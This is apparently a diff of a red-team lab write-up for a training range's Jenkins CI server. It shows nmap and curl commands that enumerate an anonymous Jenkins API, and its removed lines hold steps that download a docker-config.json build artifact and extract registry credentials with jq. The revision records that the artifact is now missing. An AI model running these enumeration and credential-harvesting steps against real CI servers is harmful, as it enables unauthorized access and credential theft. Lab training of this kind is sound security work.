@@ -2,7 +2,7 @@
 ## Red Team Solution Writeup
 **Range:** RNG-DEV-01 · VIKAS TANTRA
 **Machine:** M1 — Jenkins CI/CD Server
-**Vulnerability:** Anonymous Jenkins API access and unauthenticated build artifact download
+**Vulnerability:** Anonymous Jenkins API access and unauthenticated build artifact access
 **MITRE ATT&CK:** T1190 · T1552.001
 **Severity:** Hard
 
@@ -10,7 +10,7 @@
 
 ## Objective
 
-From Kali, identify Jenkins on the confirmed range host, verify anonymous API access, enumerate build jobs, and retrieve the `docker-config.json` artifact. Keep the same Kali terminal open for M1–M5 so the private workspace and extracted credential variables remain available.
+From Kali, identify Jenkins on the confirmed range host and verify anonymous API access. The current deployment has no archived artifact on the documented successful build, so the artifact credential step cannot be completed until the lab artifact is restored. Keep the same Kali terminal open for M1–M5 so the private workspace and later extracted values remain available.
 
 ## Environment
 
@@ -20,9 +20,10 @@ From Kali, identify Jenkins on the confirmed range host, verify anonymous API ac
 | Target | `203.0.3.36` |
 | Jenkins port | `8080` |
 | Authentication | Anonymous API access |
-| Artifact | `pul-firmware-build` → `deploy-bundle/docker-config.json` |
+| Expected job | `pul-firmware-build` |
+| Expected artifact | `deploy-bundle/docker-config.json` |
 
-## Step-by-Step Exploitation
+## Step-by-Step
 
 ### Step 1 — Scan the confirmed host
 
@@ -31,7 +32,7 @@ nmap -Pn -sV -p 22,8080,5000,9000,9200,8888 203.0.3.36
 ```
 <img width="1320" height="409" alt="WindowsTerminal_mRdhAsprXP" src="https://github.com/user-attachments/assets/92706a48-b2b0-4c39-9894-14c3feb1e751" />
 
-This scan confirmed SSH and all five range service ports open on `203.0.3.36`. The original jump-host key and `11.x.x.x/24` subnet are placeholders and do not apply to this deployment.
+This is earlier scan evidence. The original jump-host key and `11.x.x.x/24` subnet are placeholders and do not apply to this deployment.
 
 ### Step 2 — Confirm anonymous Jenkins access
 
@@ -40,59 +41,43 @@ curl --max-time 8 -fsS http://203.0.3.36:8080/api/json | jq '{useSecurity, jobs}
 ```
 <img width="1114" height="616" alt="WindowsTerminal_tOqmBSqZgX" src="https://github.com/user-attachments/assets/bff05b83-66cb-43de-995a-2e3b02ebbd1d" />
 
-The unauthenticated request returned HTTP 200 and `useSecurity: false` in the API response.
+The unauthenticated request returns HTTP 200 and reports `useSecurity: false`.
 
 ### Step 3 — Enumerate build jobs
 
 ```bash
 curl --globoff --max-time 8 -fsS "http://203.0.3.36:8080/api/json?tree=jobs[name,url,lastBuild[result,artifacts[*]]]" | jq .
 ```
-<img width="1349" height="678" alt="WindowsTerminal_x6mkzxoyxZ" src="https://github.com/user-attachments/assets/13484771-7128-4c49-8b6d-c548d493c017" />
 
-`--globoff` is required because curl otherwise interprets the square brackets in the `tree=` query as URL glob syntax. The response lists `pul-firmware-build` with a successful build and `deploy-bundle/docker-config.json`.
+`--globoff` is required because curl otherwise interprets square brackets in the `tree=` query as URL glob syntax. The live API lists `pul-firmware-build` and its last build as successful. The current build API reports an empty artifacts array.
 
-### Step 4 — Download the build artifact
+### Step 4 — Check whether the artifact is present
+
+Create the private workspace used by the later machine steps:
 
 ```bash
 export RANGE3_DIR="$(mktemp -d /tmp/range3.XXXXXX)"
+```
+
+```bash
 chmod 700 "$RANGE3_DIR"
-curl --max-time 8 -fsS "http://203.0.3.36:8080/job/pul-firmware-build/lastSuccessfulBuild/artifact/deploy-bundle/docker-config.json" -o "$RANGE3_DIR/docker-config.json"
-jq -r '(.auths | to_entries[0]) | "registry endpoint: \(.key)\ncredential present: \(.value.password != null)"' "$RANGE3_DIR/docker-config.json"
 ```
-<img width="1448" height="181" alt="WindowsTerminal_NXgwF5fd9F" src="https://github.com/user-attachments/assets/82b9f680-056f-409a-84e9-0da7679819a3" />
 
-The artifact contains the registry username, password field, and base64 `auth` field. Values are redacted here because this writeup is public. The artifact's registry host is the literal placeholder `11.x.x.x:5000`; the registry in this deployment is reachable at `203.0.3.36:5000`.
-
-### Step 5 — Check the credential fields
-
-Run each command separately in the same terminal:
+Inspect the last successful build's artifact list:
 
 ```bash
-REGISTRY_USER="$(jq -r '.auths[] | .username' "$RANGE3_DIR/docker-config.json")"
+curl --globoff --max-time 8 -fsS "http://203.0.3.36:8080/job/pul-firmware-build/lastSuccessfulBuild/api/json?tree=number,result,artifacts[fileName,relativePath]" | jq '{number, result, artifacts}'
 ```
+
+On the checked deployment, this returns build `1`, result `SUCCESS`, and `artifacts: []`. Check the documented download URL's current status:
 
 ```bash
-REGISTRY_PASSWORD_CANDIDATE="$(jq -r '.auths[] | .password' "$RANGE3_DIR/docker-config.json")"
+curl --max-time 8 -sS -o /dev/null -w 'docker-config.json HTTP %{http_code}\n' "http://203.0.3.36:8080/job/pul-firmware-build/lastSuccessfulBuild/artifact/deploy-bundle/docker-config.json"
 ```
 
-```bash
-jq -r '(.auths | to_entries[0]) as $entry | if ($entry.value.auth | @base64d) == "\($entry.value.username):\($entry.value.password)" then "auth field matches password field" else "auth field does not match password field" end' "$RANGE3_DIR/docker-config.json"
-```
+The current result is HTTP 404. Jenkins is reachable, but the artifact step cannot be completed. The API result does not establish whether the artifact was never published or was later removed. Restore or republish it through the lab Jenkins setup before capturing a current artifact-download screenshot. Do not use a previously downloaded local copy as evidence that the live Jenkins artifact is available.
 
-```bash
-export REGISTRY_USER
-```
-
-```bash
-export REGISTRY_PASSWORD_CANDIDATE
-```
-
-```bash
-printf 'Registry credential loaded for %s\n' "$REGISTRY_USER"
-```
-<img width="1448" height="397" alt="WindowsTerminal_15wSvydSMd" src="https://github.com/user-attachments/assets/e8cfe3bb-4f73-4ad2-9dec-6fa2f51c0ee2" />
-
-On this artifact the base64 `auth` value decodes to the same username but a different password than the separate password field. Do not treat that password candidate as validated. M2's read API is anonymous, so the mismatch does not block the next documented steps.
+The older screenshots showing the job artifact and its credential fields have been removed because they do not match the current build state. M2's registry read API is independently accessible without the M1 credential.
 
 ## MITRE ATT&CK Mapping
 
@@ -105,4 +90,4 @@ On this artifact the base64 `auth` value decodes to the same username but a diff
 
 ## Notes for Operator
 
-The public Jenkins API response reports `useSecurity: false`. On the host, `config.xml` has `useSecurity=true` but uses `SecurityRealm$None` and `AuthorizationStrategy$Unsecured`, so the flag does not indicate that access is protected.
+The public Jenkins API response reports `useSecurity: false`. On the host, `config.xml` has `useSecurity=true` but uses `SecurityRealm$None` and `AuthorizationStrategy$Unsecured`, so the flag does not indicate that access is protected. Live verification on 2026-11-03 confirmed HTTP 200 for the anonymous API and no artifacts on the successful build.
